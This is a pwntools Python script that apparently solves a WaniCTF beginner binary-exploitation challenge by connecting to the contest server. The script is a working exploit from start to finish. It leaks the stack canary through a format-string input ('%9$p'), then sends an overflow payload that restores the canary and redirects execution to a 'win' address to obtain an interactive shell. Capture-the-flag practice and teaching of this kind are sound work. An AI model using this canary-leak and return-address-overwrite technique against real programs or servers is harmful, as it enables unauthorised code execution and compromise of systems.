#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

local = False
if(local):
    io = process(exe)
else:
    io = remote('beginners-rop-pwn.wanictf.org', 9006)

# =========================================================
#                         ADDRESSES
# =========================================================
win = 0x401245

# =========================================================
#                         EXPLOITS
# =========================================================

# Manual Calculation from Ghidra Stack
offset = 24
junk = 0x0

# format string to leak canary
io.sendlineafter(b'Do you agree with me? : ', '%9$p'.encode())
canary = int(io.recvline().decode().strip(), 16)
log.info(f"{hex(canary)=}")

# gdbscript = '''
# init-pwndbg
# continue
# '''.format(**locals())
# gdb.attach(io, gdbscript=gdbscript)

# flattening  payload here
payload = flat({
    offset: [
        canary,
        junk,
        win
    ]
})

# send payload to get shell
io.sendlineafter(b'Do you agree with me? : ', payload)
io.sendline(b'YES')

io.interactive()